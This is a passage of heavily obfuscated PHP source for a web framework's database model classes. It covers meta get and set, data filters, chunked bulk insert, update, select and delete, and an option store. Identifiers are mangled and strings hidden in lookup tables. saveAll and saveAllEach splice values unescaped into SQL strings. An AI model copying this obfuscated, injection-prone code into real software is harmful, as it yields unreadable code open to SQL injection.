$⁄⁄Ö€“[382] => $ΩûæÔ¶ü); if (is_null($ΩûæÔ¶ü)) { return $‹îüÎ¡Ï->where(array($ôñË’ÈÎ => $ß£„çÖ†))->delete(); } if (is_null($â¿ø¡ÿË) && is_string($ΩûæÔ¶ü)) { return $‹îüÎ¡Ï->where($æÇ∆∫º“)->delete(); } $˝Îº…◊¢ = is_array($ΩûæÔ¶ü) ? $ΩûæÔ¶ü : array(); if (is_string($ΩûæÔ¶ü)) { $˝Îº…◊¢[$ΩûæÔ¶ü] = $â¿ø¡ÿË; } $Ø“èÖÌÓ = array(); foreach ($˝Îº…◊¢ as $û«≤”±Û => $©∂…òÓÇ) { if (is_null($©∂…òÓÇ) && is_string($û«≤”±Û)) { $‹îüÎ¡Ï->where(array($ôñË’ÈÎ => $ß£„çÖ†, $⁄⁄Ö€“[382] => $û«≤”±Û))->delete(); continue; } $this->checkLength($©∂…òÓÇ, !1, $æ˛©Á™° . $⁄⁄Ö€“[4] . $û«≤”±Û); $Ø“èÖÌÓ[] = array($ôñË’ÈÎ => $ß£„çÖ†, $⁄⁄Ö€“[104] => $û«≤”±Û, $⁄⁄Ö€“[383] => $©∂…òÓÇ); } $®ä÷„¡ù = $⁄⁄Ö€“[384] . $æ˛©Á™°; CacheLock::lock($®ä÷„¡ù); $‹îüÎ¡Ï->where(array($ôñË’ÈÎ => $ß£„çÖ†))->addAll($Ø“èÖÌÓ, array(), !0); CacheLock::unlock($®ä÷„¡ù); return !0; } public function metaGet($üªü€ÄÌ, $À—Òõ≤— = false) { $…§‹¿æ¯ =& $_SERVER[Á≈ ä ∞]; if (!$this->tableMeta) { return array(); } $˙Òå«„¸ = $this->tableMeta[$…§‹¿æ¯[380]]; $…•˜Ä¸€ = Model($this->tableMeta[$…§‹¿æ¯[381]]); if ($À—Òõ≤—) { $≠ÓïïΩœ = array($˙Òå«„¸ => $üªü€ÄÌ, $…§‹¿æ¯[104] => $À—Òõ≤—); return $…•˜Ä¸€->where($≠ÓïïΩœ)->getField($…§‹¿æ¯[383]); } $≠ÓïïΩœ = array($˙Òå«„¸ => $üªü€ÄÌ); $ÉºÚË»Ÿ = $…•˜Ä¸€->field($…§‹¿æ¯[385])->where($≠ÓïïΩœ)->select(); $ÉºÚË»Ÿ = array_to_keyvalue($ÉºÚË»Ÿ, $…§‹¿æ¯[104], $…§‹¿æ¯[383]); return $ÉºÚË»Ÿ; } private function checkDataAutoHas($Ç—◊¿ôö) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÑîÒ°¥ö) { if (in_array($Ç—◊¿ôö, explode($_SERVER[Á≈ ä ∞][60], $ÑîÒ°¥ö[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ì§›Ãﬁû, $¶ú…ÛòÍ) { $ØΩ˘§Ó =& $_SERVER[Á≈ ä ∞]; if (!is_array($ì§›Ãﬁû)) { return; } foreach ($this->dataAuto as $èÂÊı◊é) { $ñÏ‰ñõÃ = $èÂÊı◊é[0]; if (!in_array($¶ú…ÛòÍ, explode($ØΩ˘§Ó[60], $èÂÊı◊é[2]))) { continue; } switch (trim($èÂÊı◊é[3])) { case $ØΩ˘§Ó[330]: case $ØΩ˘§Ó[331]: $Ô®¡Ÿß´ = $èÂÊı◊é[1]; $ûáùùî¢ = isset($èÂÊı◊é[4]) ? (array) $èÂÊı◊é[4] : array(); if ($Ô®¡Ÿß´ == $ØΩ˘§Ó[213] && array_key_exists($ñÏ‰ñõÃ, $ì§›Ãﬁû)) { if (!$ì§›Ãﬁû[$ñÏ‰ñõÃ]) { unset($ì§›Ãﬁû[$ñÏ‰ñõÃ]); } break; } if (isset($ì§›Ãﬁû[$ñÏ‰ñõÃ])) { array_unshift($ûáùùî¢, $ì§›Ãﬁû[$ñÏ‰ñõÃ]); } if ($ØΩ˘§Ó[330] == $èÂÊı◊é[3]) { $ì§›Ãﬁû[$ñÏ‰ñõÃ] = call_user_func_array($Ô®¡Ÿß´, $ûáùùî¢); } else { $ì§›Ãﬁû[$ñÏ‰ñõÃ] = call_user_func_array(array(&$this, $Ô®¡Ÿß´), $ûáùùî¢); } break; case $ØΩ˘§Ó[279]: if (isset($ì§›Ãﬁû[$ñÏ‰ñõÃ]) && $ì§›Ãﬁû[$ñÏ‰ñõÃ]) { $ì§›Ãﬁû[$ñÏ‰ñõÃ] = call_user_func_array(array(&$this, $èÂÊı◊é[1]), array($ì§›Ãﬁû[$ñÏ‰ñõÃ])); } break; case $ØΩ˘§Ó[282]: $ì§›Ãﬁû[$ñÏ‰ñõÃ] = $ì§›Ãﬁû[$èÂÊı◊é[1]]; break; case $ØΩ˘§Ó[303]: if (isset($ì§›Ãﬁû[$ñÏ‰ñõÃ]) && !is_string($ì§›Ãﬁû[$ñÏ‰ñõÃ])) { $ì§›Ãﬁû[$ñÏ‰ñõÃ] = json_encode_force($ì§›Ãﬁû[$ñÏ‰ñõÃ]); } break; case $ØΩ˘§Ó[332]: if ($ì§›Ãﬁû[$ñÏ‰ñõÃ] === $ØΩ˘§Ó[22]) { unset($ì§›Ãﬁû[$ñÏ‰ñõÃ]); } break; case $ØΩ˘§Ó[333]: $ì§›Ãﬁû[$ñÏ‰ñõÃ] = $èÂÊı◊é[1]; default: break; } } if ($¶ú…ÛòÍ == $ØΩ˘§Ó[364]) { $…•ÎéÃ¬ = strtolower($this->db->getDbType()); if (strpos($…•ÎéÃ¬, $ØΩ˘§Ó[23]) !== 0) { return; } $‘·ª¯‘Å = $this->field(!0)->fields; $∞˜óªöÆ = $‘·ª¯‘Å[$ØΩ˘§Ó[261]]; if (isset($‘·ª¯‘Å[$ØΩ˘§Ó[260]])) { unset($∞˜óªöÆ[$‘·ª¯‘Å[$ØΩ˘§Ó[260]]]); } foreach ($∞˜óªöÆ as $˙ù’éı∫ => $¶ú…ÛòÍ) { if (!isset($ì§›Ãﬁû[$˙ù’éı∫])) { $ì§›Ãﬁû[$˙ù’éı∫] = $ØΩ˘§Ó[22]; } } } } private function dataAfterFilter(&$€°ˆÈ»´) { $ÊóÔ˙¸ò =& $_SERVER[Á≈ ä ∞]; foreach ($this->dataAuto as $ê˚åÛì∏) { $ƒ¥ı∂ûî = $ê˚åÛì∏[0]; if (!isset($€°ˆÈ»´[$ƒ¥ı∂ûî])) { continue; } if (!in_array($ÊóÔ˙¸ò[366], explode($ÊóÔ˙¸ò[60], $ê˚åÛì∏[2]))) { continue; } switch (trim($ê˚åÛì∏[3])) { case $ÊóÔ˙¸ò[330]: case $ÊóÔ˙¸ò[331]: $ê”Ωï›Á = isset($ê˚åÛì∏[4]) ? (array) $ê˚åÛì∏[4] : array(); array_unshift($ê”Ωï›Á, $€°ˆÈ»´[$ƒ¥ı∂ûî]); if (isset($ê˚åÛì∏[4]) && $ê˚åÛì∏[4] == $ÊóÔ˙¸ò[386]) { $ê”Ωï›Á = array($€°ˆÈ»´[$ƒ¥ı∂ûî]); } if ($ÊóÔ˙¸ò[330] == $ê˚åÛì∏[3]) { $€°ˆÈ»´[$ƒ¥ı∂ûî] = call_user_func_array($ê˚åÛì∏[1], $ê”Ωï›Á); } else { $€°ˆÈ»´[$ƒ¥ı∂ûî] = call_user_func_array(array(&$this, $ê˚åÛì∏[1]), $ê”Ωï›Á); } break; case $ÊóÔ˙¸ò[279]: if (isset($€°ˆÈ»´[$ƒ¥ı∂ûî]) && $€°ˆÈ»´[$ƒ¥ı∂ûî]) { $€°ˆÈ»´[$ƒ¥ı∂ûî] = call_user_func_array(array(&$this, $ê˚åÛì∏[1]), array($€°ˆÈ»´[$ƒ¥ı∂ûî])); } break; case $ÊóÔ˙¸ò[282]: $€°ˆÈ»´[$ƒ¥ı∂ûî] = $€°ˆÈ»´[$ê˚åÛì∏[1]]; break; case $ÊóÔ˙¸ò[303]: $úΩˆæïÔ = $€°ˆÈ»´[$ƒ¥ı∂ûî]; $€°ˆÈ»´[$ƒ¥ı∂ûî] = json_decode($úΩˆæïÔ, !0); if (is_null($€°ˆÈ»´[$ƒ¥ı∂ûî])) { $€°ˆÈ»´[$ƒ¥ı∂ûî] = $úΩˆæïÔ; } break; case $ÊóÔ˙¸ò[332]: if ($€°ˆÈ»´[$ƒ¥ı∂ûî] === $ÊóÔ˙¸ò[22]) { unset($€°ˆÈ»´[$ƒ¥ı∂ûî]); } break; case $ÊóÔ˙¸ò[333]: $€°ˆÈ»´[$ƒ¥ı∂ûî] = $ê˚åÛì∏[1]; break; default: break; } } } public function saveAll($Ù¶ÇœÙ±) { $‡≥ “›¸ =& $_SERVER[Á≈ ä ∞]; $ÕÒﬁ“˙â = $this->tablePrefix . $this->tableName; $Æò‹¯˜Ÿ = self::SQL_WHERE_IN_CHUNK; $Ù¶ÇœÙ± = is_array($Ù¶ÇœÙ±) ? $Ù¶ÇœÙ± : array(); $ìèéÛ§Á = $‡≥ “›¸[387]; $‘«Üß˙· = 0; $¥èå‰…ÿ = array(); $è•êº”Ç = count($Ù¶ÇœÙ±); for ($Ωáå©∞á = 0; $Ωáå©∞á < $è•êº”Ç; $Ωáå©∞á++) { $Ø’’Ÿ›– = $Ù¶ÇœÙ±[$Ωáå©∞á]; if (!is_array($Ø’’Ÿ›–) || count($Ø’’Ÿ›–) != 4) { continue; } $© è¥àê = "\125\x50\104\x41\124\105\x20\x60{$ÕÒﬁ“˙â}\x60\x20\123\x45\x54\40{$Ø’’Ÿ›–[2]}\40\x3d\x20\x43\x41\x53\105\x20{$Ø’’Ÿ›–[0]}\40\xa"; if ($‘«Üß˙· == 0) { $ìèéÛ§Á = $© è¥àê; } $¥èå‰…ÿ[] = $‡≥ “›¸[128] . $Ø’’Ÿ›–[1] . $‡≥ “›¸[128]; $‘«Üß˙·++; $ìèéÛ§Á .= "\x20\127\110\x45\116\x20\x27{$Ø’’Ÿ›–[1]}\x27\40\x54\110\x45\116\40\47{$Ø’’Ÿ›–[3]}\47\x20\12"; if ($‘«Üß˙· == $Æò‹¯˜Ÿ || $Ωáå©∞á == $è•êº”Ç - 1) { $˝ü∞ˆÚÓ = implode($‡≥ “›¸[60], $¥èå‰…ÿ); $ìèéÛ§Á .= "\x20\105\116\x44\x20\40\127\110\105\x52\105\40{$Ø’’Ÿ›–[0]}\x20\111\116\x20\x28{$˝ü∞ˆÚÓ}\51\40"; $this->execute($ìèéÛ§Á); $‘«Üß˙· = 0; $ìèéÛ§Á = $© è¥àê; $this->chunkEventCheck(count($¥èå‰…ÿ)); $¥èå‰…ÿ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ã‡≈ê£ù) { $Óé‘úóâ =& $_SERVER[Á≈ ä ∞]; $ˆ€·áﬂ∂ = $this->tablePrefix . $this->tableName; foreach ($ã‡≈ê£ù as $ÌÙíΩÇΩ) { if (!is_array($ÌÙíΩÇΩ) || count($ÌÙíΩÇΩ) != 4) { continue; } $·“Ú≥¥ı = $ÌÙíΩÇΩ[0] . $Óé‘úóâ[388] . $ÌÙíΩÇΩ[1] . $Óé‘úóâ[128]; $Øä¬’ñ≠ = $ÌÙíΩÇΩ[2] . $Óé‘úóâ[388] . $ÌÙíΩÇΩ[3] . $Óé‘úóâ[128]; $¬äÅ¥”∂ = "\x75\160\144\x61\x74\145\x20{$ˆ€·áﬂ∂}\x20\x73\145\x74\x20{$Øä¬’ñ≠}\x20\x77\150\145\x72\x65\x20{$·“Ú≥¥ı}\73"; $this->execute($¬äÅ¥”∂); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ú˚óÅÈ˝ = false, $¶Ú‚Íﬂì = false) { $this->_chunkEvent = $ú˚óÅÈ˝; $this->_chunkEventParam = $¶Ú‚Íﬂì; } private function chunkEventCheck($∂ü‡á◊„) { if (!$this->_chunkEvent) { return; } $…èû⁄öê = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $…èû⁄öê[$_SERVER[Á≈ ä ∞][389]] = $∂ü‡á◊„; Hook::trigger($this->_chunkEvent, $…èû⁄öê); } public function addAll($…Ÿ≤ƒ∞∏, $Û¯ó¿ü˚ = array(), $ëº–·±Ù = false) { $û∂Á§ˆƒ =& $_SERVER[Á≈ ä ∞]; ignore_timeout(); $çáóé¸ö = self::SQL_WHERE_IN_CHUNK; if (empty($…Ÿ≤ƒ∞∏)) { $this->error = think_lang($û∂Á§ˆƒ[280]); return !1; } $Û¯ó¿ü˚ = $this->_parseOptions($Û¯ó¿ü˚); foreach ($…Ÿ≤ƒ∞∏ as $‹’â√õÌ => $Â˚¢€˙Á) { $…Ÿ≤ƒ∞∏[$‹’â√õÌ] = $this->_facade($Â˚¢€˙Á); $this->_beforeInsert($…Ÿ≤ƒ∞∏[$‹’â√õÌ], $Û¯ó¿ü˚); } if (method_exists($this->db, $û∂Á§ˆƒ[281])) { for ($†˝©ÃÁ¸ = 0; $†˝©ÃÁ¸ < count($…Ÿ≤ƒ∞∏); $†˝©ÃÁ¸ += $çáóé¸ö) { $πŸ∂—¸ã = array_slice($…Ÿ≤ƒ∞∏, $†˝©ÃÁ¸, $çáóé¸ö); if (!is_array($πŸ∂—¸ã) || count($πŸ∂—¸ã) == 0) { break; } $ÆπÂ¸å∂ = $this->db->insertAll($πŸ∂—¸ã, $Û¯ó¿ü˚, $ëº–·±Ù); $this->chunkEventCheck(count($πŸ∂—¸ã)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($…Ÿ≤ƒ∞∏ as $‹’â√õÌ => $Â˚¢€˙Á) { $ÆπÂ¸å∂ = $this->db->insert($Â˚¢€˙Á, $Û¯ó¿ü˚, $ëº–·±Ù); } $this->commit(); } if (!1 !== $ÆπÂ¸å∂) { $§ÚËê®Æ = $this->getLastInsID(); if ($§ÚËê®Æ) { return $§ÚËê®Æ; } } return $ÆπÂ¸å∂; } public function save($ﬁâ°‰¨» = '', $†ÃÒæ™© = array()) { $ÇÏÃòΩí =& $_SERVER[Á≈ ä ∞]; $“¿“â— = self::SQL_WHERE_IN_CHUNK; $∞©’ıÒ† = $this->optionsValue(); $ÆøÁ‚àà = $this->findWhereField($∞©’ıÒ†); if (!$ÆøÁ‚àà) { return parent::save($ﬁâ°‰¨», $†ÃÒæ™©); } $∑ûÑÑ∏Œ = 0; $íüªª®¿ = $∞©’ıÒ†[$ÇÏÃòΩí[284]][$ÆøÁ‚àà][1]; $íüªª®¿ = is_array($íüªª®¿) ? $íüªª®¿ : array(); $∆≥óﬁΩÕ = count($íüªª®¿); for ($ÕàÁûº∆ = 0; $ÕàÁûº∆ < $∆≥óﬁΩÕ; $ÕàÁûº∆ += $“¿“â—) { $¥«§ï›é = array_slice($íüªª®¿, $ÕàÁûº∆, $“¿“â—); if (!is_array($¥«§ï›é) || count($¥«§ï›é) == 0) { break; } $∞©’ıÒ†[$ÇÏÃòΩí[284]][$ÆøÁ‚àà][1] = $¥«§ï›é; $this->optionsValue($∞©’ıÒ†); $∑ûÑÑ∏Œ += parent::save($ﬁâ°‰¨», $†ÃÒæ™©); $this->chunkEventCheck(count($¥«§ï›é)); } $this->chunkEventSet(); return $∑ûÑÑ∏Œ; } public function add($ô∫ë´™ª = '', $¸∫…–˘µ = array(), $‰ã©Ô‡ó = false) { if ($this->addTaskStatus && is_array($ô∫ë´™ª)) { $this->addTaskData[] = $ô∫ë´™ª; return; } return parent::add($ô∫ë´™ª, $¸∫…–˘µ, $‰ã©Ô‡ó); } public function parseWhereLike($ÙÂ≥ÄòÒ, $ı Ÿß∂ñ = '', $ºÃﬁ‚˝à = false, &$íªËã ˛ = false) { $º§≠∞∂ñ =& $_SERVER[Á≈ ä ∞]; $œ°πóûﬁ = $GLOBALS[$º§≠∞∂ñ[16]][$º§≠∞∂ñ[390]]; if (!$œ°πóûﬁ[$º§≠∞∂ñ[391]]) { return $ÙÂ≥ÄòÒ; } if (!is_array($ÙÂ≥ÄòÒ)) { return $ÙÂ≥ÄòÒ; } $¥àˆ—éö = array(); $ﬂ∂ﬁ¨«¬ = 0; foreach ($ÙÂ≥ÄòÒ as $Íô≤∂Ú∑ => $ûæò‡˝‹) { if (is_array($ûæò‡˝‹) && count($ûæò‡˝‹) == 2 && $ûæò‡˝‹[0] == $º§≠∞∂ñ[392] && is_string($ûæò‡˝‹[1]) && substr($ûæò‡˝‹[1], 0, 1) == $º§≠∞∂ñ[393] && substr($ûæò‡˝‹[1], strlen($ûæò‡˝‹[1]) - 1, 1) == $º§≠∞∂ñ[393]) { $íªËã ˛ = !0; $ıËﬁ⁄µ™ = is_string($Íô≤∂Ú∑) ? $Íô≤∂Ú∑ : $ı Ÿß∂ñ; $ËŒ“»¶Ô = substr($ûæò‡˝‹[1], 1, strlen($ûæò‡˝‹[1]) - 2); $ËŒ“»¶Ô = $this->db->escapeString($ËŒ“»¶Ô); if (!strpos($ıËﬁ⁄µ™, $º§≠∞∂ñ[20])) { $ıËﬁ⁄µ™ = $º§≠∞∂ñ[394] . $ıËﬁ⁄µ™ . $º§≠∞∂ñ[394]; } $æ¯Õ◊ªÙ = $º§≠∞∂ñ[198] . $ËŒ“»¶Ô . $º§≠∞∂ñ[198]; $ËŒ“»¶Ô = str_replace(array($º§≠∞∂ñ[20], $º§≠∞∂ñ[395], $º§≠∞∂ñ[21]), $º§≠∞∂ñ[396], $ËŒ“»¶Ô); if ($œ°πóûﬁ[$º§≠∞∂ñ[397]]) { $æ¯Õ◊ªÙ = $º§≠∞∂ñ[398] . $ËŒ“»¶Ô . $º§≠∞∂ñ[399]; if ($œ°πóûﬁ[$º§≠∞∂ñ[400]]) { $æ¯Õ◊ªÙ = $º§≠∞∂ñ[399] . $ËŒ“»¶Ô . $º§≠∞∂ñ[398]; } } $¥àˆ—éö[$ﬂ∂ﬁ¨«¬] = $º§≠∞∂ñ[401] . $ıËﬁ⁄µ™ . $º§≠∞∂ñ[402] . $æ¯Õ◊ªÙ . $º§≠∞∂ñ[403]; $ﬂ∂ﬁ¨«¬++; continue; } if (is_array($ûæò‡˝‹)) { $ı Ÿß∂ñ = is_string($Íô≤∂Ú∑) ? $Íô≤∂Ú∑ : $ı Ÿß∂ñ; $ûæò‡˝‹ = $this->parseWhereLike($ûæò‡˝‹, $ı Ÿß∂ñ, !0, $íªËã ˛); } if (is_numeric($Íô≤∂Ú∑)) { $¥àˆ—éö[$ﬂ∂ﬁ¨«¬] = $ûæò‡˝‹; $ﬂ∂ﬁ¨«¬++; } else { $¥àˆ—éö[$Íô≤∂Ú∑] = $ûæò‡˝‹; } } if ($íªËã ˛ && !$ºÃﬁ‚˝à) { } return $¥àˆ—éö; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Â¨∂ÒìÅ = array()) { $íµè—¸à =& $_SERVER[Á≈ ä ∞]; $ú‘Ì€◊ö = self::SQL_WHERE_IN_CHUNK; $≈–Îàäã = $this->optionsValue(); $Å£÷˘—≥ = $this->findWhereField($≈–Îàäã); if (!$Å£÷˘—≥ || isset($≈–Îàäã[$íµè—¸à[301]]) || isset($≈–Îàäã[$íµè—¸à[362]])) { return parent::select($Â¨∂ÒìÅ); } $ü£çŸÂØ = $≈–Îàäã[$íµè—¸à[284]][$Å£÷˘—≥][1]; $ü£çŸÂØ = is_array($ü£çŸÂØ) ? $ü£çŸÂØ : array(); $Ã¶ß˘¡ = null; for ($ƒ≤éÄ‚† = 0; $ƒ≤éÄ‚† < count($ü£çŸÂØ); $ƒ≤éÄ‚† += $ú‘Ì€◊ö) { $ÌÏ•ÂÈ⁄ = array_slice($ü£çŸÂØ, $ƒ≤éÄ‚†, $ú‘Ì€◊ö); if (!is_array($ÌÏ•ÂÈ⁄) || count($ÌÏ•ÂÈ⁄) == 0) { break; } $≈–Îàäã[$íµè—¸à[284]][$Å£÷˘—≥][1] = $ÌÏ•ÂÈ⁄; $this->optionsValue($≈–Îàäã); $≠Ë≤çèì = parent::select($Â¨∂ÒìÅ); if (!$≠Ë≤çèì) { continue; } $Ã¶ß˘¡ = is_array($Ã¶ß˘¡) ? $Ã¶ß˘¡ : array(); $Ã¶ß˘¡ = array_merge($Ã¶ß˘¡, $≠Ë≤çèì); } return $Ã¶ß˘¡; } public function delete($µÉıﬂæ¸ = array()) { $§˝˙Àäû =& $_SERVER[Á≈ ä ∞]; $ñâ˛óì– = self::SQL_WHERE_IN_CHUNK; $ü§Î∂†π = $this->optionsValue(); $®·‡ì◊Ù = $this->findWhereField($ü§Î∂†π); if (!$®·‡ì◊Ù) { return parent::delete($µÉıﬂæ¸); } $ºö ¬≠á = 0; $É¡¿Ä—â = $ü§Î∂†π[$§˝˙Àäû[284]][$®·‡ì◊Ù][1]; $É¡¿Ä—â = is_array($É¡¿Ä—â) ? $É¡¿Ä—â : array(); for ($ÙÃªÿåï = 0; $ÙÃªÿåï < count($É¡¿Ä—â); $ÙÃªÿåï += $ñâ˛óì–) { $æ£≠·áË = array_slice($É¡¿Ä—â, $ÙÃªÿåï, $ñâ˛óì–); if (!is_array($æ£≠·áË) || count($æ£≠·áË) == 0) { break; } $ü§Î∂†π[$§˝˙Àäû[284]][$®·‡ì◊Ù][1] = $æ£≠·áË; $this->optionsValue($ü§Î∂†π); $ºö ¬≠á += parent::delete($µÉıﬂæ¸); } return $ºö ¬≠á; } private function findWhereField($ú˚ﬂ®Á¢) { $–¯è≈ÆÈ =& $_SERVER[Á≈ ä ∞]; $Ñµ˝»®ª = self::SQL_WHERE_IN_CHUNK; if (!is_array($ú˚ﬂ®Á¢) || !is_array($ú˚ﬂ®Á¢[$–¯è≈ÆÈ[284]])) { return !1; } foreach ($ú˚ﬂ®Á¢[$–¯è≈ÆÈ[284]] as $†πËﬂë¡ => $úŒÍŸâÓ) { if (is_array($úŒÍŸâÓ) && isset($úŒÍŸâÓ[0]) && is_string($úŒÍŸâÓ[0]) && strtolower($úŒÍŸâÓ[0]) == $–¯è≈ÆÈ[17] && is_array($úŒÍŸâÓ[1]) && count($úŒÍŸâÓ[1]) > $Ñµ˝»®ª) { ignore_timeout(); return $†πËﬂë¡; } } return !1; } public function setMasterDB($ÑØ†ùﬂΩ = true) { think_config($_SERVER[Á≈ ä ∞][404], $ÑØ†ùﬂΩ); } } goto e—’â°Á‹ã; f¡µ—°€‰≠: define($_SERVER[Á≈ ä ∞][249], 3); define($_SERVER[Á≈ ä ∞][250], 1); define($_SERVER[Á≈ ä ∞][251], 0); goto c€ßœ‰¨¨ã; e—’â°Á‹ã: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\x6d\117\x70\164\151\157\x6e"; public $field = array(); public function listData($ëñ—◊¥‹ = false, $ûâ€Ω«é = "\x6d\157\144\x69\146\x79\124\x69\x6d\x65", $ÆÍé¶ÿ≤ = false) { $Á∂òî„ó = Model($this->modelType)->get(!1, $this->optionType, !0); $ô¬ù—ºè = array_values($Á∂òî„ó); if ($ô¬ù—ºè && $ô¬ù—ºè[0] && !is_array($ô¬ù—ºè[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Á∂òî„ó = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Á∂òî„ó) { return $ëñ—◊¥‹ ? null : array(); } if (!$ëñ—◊¥‹) { $Á∂òî„ó = array_filter(array_values($Á∂òî„ó)); return array_sort_by($Á∂òî„ó, $ûâ€Ω«é, $ÆÍé¶ÿ≤); } return $Á∂òî„ó[$_SERVER[Á≈ ä ∞][405] . $ëñ—◊¥‹]; } public function insert($‰ÿö∆ßÙ) { $…¡ÂŒÃÕ =& $_SERVER[Á≈ ä ∞]; $‰ÿö∆ßÙ = array_field_key($‰ÿö∆ßÙ, $this->field); $¯Éô⁄÷© = Model($this->modelType)->get($…¡ÂŒÃÕ[406], $this->optionType . $…¡ÂŒÃÕ[407]); $¯Éô⁄÷© = $¯Éô⁄÷© ? $¯Éô⁄÷© : 0; $‰ÿö∆ßÙ[$…¡ÂŒÃÕ[408]] = ++$¯Éô⁄÷©; $‰ÿö∆ßÙ[$…¡ÂŒÃÕ[210]] = time(); $‰ÿö∆ßÙ[$…¡ÂŒÃÕ[95]] = time(); Model($this->modelType)->set($…¡ÂŒÃÕ[406], $¯Éô⁄÷©, $this->optionType . $…¡ÂŒÃÕ[407]); Model($this->modelType)->set($…¡ÂŒÃÕ[405] . $¯Éô⁄÷©, $‰ÿö∆ßÙ, $this->optionType); return $¯Éô⁄÷©; } public function update($˜Ñà˘ò˘, $Õ˛Ì≥∂ü) { $ø†˙ÊÄÇ =& $_SERVER[Á≈ ä ∞]; $Õ˛Ì≥∂ü = array_field_key($Õ˛Ì≥∂ü, $this->field); $˜Ó†¸Ä˚ = $this->listData($˜Ñà˘ò˘); if (!$˜Ó†¸Ä˚ || !$˜Ñà˘ò˘) { return !1; } $Õ˛Ì≥∂ü = array_merge($˜Ó†¸Ä˚, $Õ˛Ì≥∂ü); $Õ˛Ì≥∂ü[$ø†˙ÊÄÇ[95]] = time(); return Model($this->modelType)->set($ø†˙ÊÄÇ[405] . $˜Ñà˘ò˘, $Õ˛Ì≥∂ü, $this->optionType); } public function remove($ÖÜ∫ÃèÂ) { if (!$ÖÜ∫ÃèÂ) { return !1; } return Model($this->modelType)->remove($_SERVER[Á≈ ä ∞][405] . $ÖÜ∫ÃèÂ, $this->optionType); } public function clear() { $…‘÷Ï˙‘ =& $_SERVER[Á≈ ä ∞]; Model($this->modelType)->remove($…‘÷Ï˙‘[406], $this->optionType . $…‘÷Ï˙‘[407]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ﬁí≥÷˚ê, $ã´∫¶÷ˆ) { if (!$ã´∫¶÷ˆ) { return !1; } $∞À√§œ¢ = $this->listData(); $∞À√§œ¢ = array_to_keyvalue($∞À√§œ¢, $ﬁí≥÷˚ê); return isset($∞À√§œ¢[$ã´∫¶÷ˆ]) ? $∞À√§œ¢[$ã´∫¶÷ˆ] : !1; } public function findByName($È˝‘ÍΩÒ) { return $this->findByKey($_SERVER[Á≈ ä ∞][42], $È˝‘ÍΩÒ); } protected function resetData($÷Ω≈—⁄‡) { $üïûÍŒÅ =& $_SERVER[Á≈ ä ∞]; $÷Ω≈—⁄‡ = is_array($÷Ω≈—⁄‡) ? $÷Ω≈—⁄‡ : array(); $ø®ˆ–Ö∑ = array(); for ($üÒΩÛï÷ = 0; $üÒΩÛï÷ < count($÷Ω≈—⁄‡); $üÒΩÛï÷++) { $ø®ˆ–Ö∑[$üïûÍŒÅ[405] . $÷Ω≈—⁄‡[$üÒΩÛï÷][$üïûÍŒÅ[408]]] = $÷Ω≈—⁄‡[$üÒΩÛï÷]; } return Model($this->modelType)->set($ø®ˆ–Ö∑, !1, $this->optionType); } private function getAutoName($Ùá÷‡É†) { $Ö‚ƒ∫®Á = array_to_keyvalue($this->listData(), $_SERVER[Á≈ ä ∞][42]); if (!$Ö‚ƒ∫®Á || !isset($Ö‚ƒ∫®Á[$Ùá÷‡É†])) { return $Ùá÷‡É†; } for ($ïá¿êË¬ = 1; $ïá¿êË¬ < count($Ö‚ƒ∫®Á); $ïá¿êË¬++) { $ÏºÜÎÂÁ = $Ùá÷‡É† . "\50{$ïá¿êË¬}\51"; if (!isset($Ö‚ƒ∫®Á[$ÏºÜÎÂÁ])) { return $ÏºÜÎÂÁ; } } return $ÏºÜÎÂÁ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($‹¶Ô∑·Ó = false, $áà»€Éã = '', $êπÈÙÑí = false) { $ïœΩÛ’‰ =& $_SERVER[Á≈ ä ∞]; $Œãïùø· = $this->cacheGet($áà»€Éã); $¬˜†Çìó = $this->optionDefault($áà»€Éã); $¬˜†Çìó = is_array($¬˜†Çìó) ? $¬˜†Çìó : array(); if (is_array($Œãïùø·)) { $Œãïùø· = array_merge($¬˜†Çìó, $Œãïùø·); return $‹¶Ô∑·Ó ? isset($Œãïùø·[$‹¶Ô∑·Ó]) ? $Œãïùø·[$‹¶Ô∑·Ó] : null : $Œãïùø·; } $Ù∂˙ùîÎ = $this->filterWhere(array($ïœΩÛ’‰[43] => $áà»€Éã)); $Œãïùø· = $this->where($Ù∂˙ùîÎ)->select(); $Œãïùø· = array_to_keyvalue($Œãïùø·, $ïœΩÛ’‰[104], $ïœΩÛ’‰[383]); foreach ($Œãïùø· as $ò©ÏŸËÆ => $Ö„Ü§±˜) { if ($êπÈÙÑí || in_array($ò©ÏŸËÆ, $this->jsonField)) { $Œãïùø·[$ò©ÏŸËÆ] = json_decode($Ö„Ü§±˜, !0); } } $this->cacheSet($áà»€Éã, $Œãïùø·); $Œãïùø· = array_merge($¬˜†Çìó, $Œãïùø·); return $‹¶Ô∑·Ó ? $Œãïùø·[$‹¶Ô∑·Ó] : $Œãïùø·; } public function set($í§ã÷√˚, $öèŸíß˝ = false, $≥≤ÍùàÙ = '') { $˜Ñ«ƒ“ç =& $_SERVER[Á≈ ä ∞]; $this->cacheRemove($≥≤ÍùàÙ); $˜Ö•Ñ’ = array(); $¯›Ø≥ˆµ = is_array($í§ã÷√˚) ? $í§ã÷√˚ : array($í§ã÷√˚ => $öèŸíß˝); foreach ($¯›Ø≥ˆµ as $¥∞•Ú§¶ => $ÀÉﬁÙ’¿) { if (is_array($ÀÉﬁÙ’¿)) { $ÀÉﬁÙ’¿ = json_encode_force($ÀÉﬁÙ’¿); } $this->checkLength($ÀÉﬁÙ’¿, !1, $this->tableName . $˜Ñ«ƒ“ç[4] . $í§ã÷√˚); $ÀÉﬁÙ’¿ = self::textEncode($ÀÉﬁÙ’¿); $¯›Ø≥ˆµ = 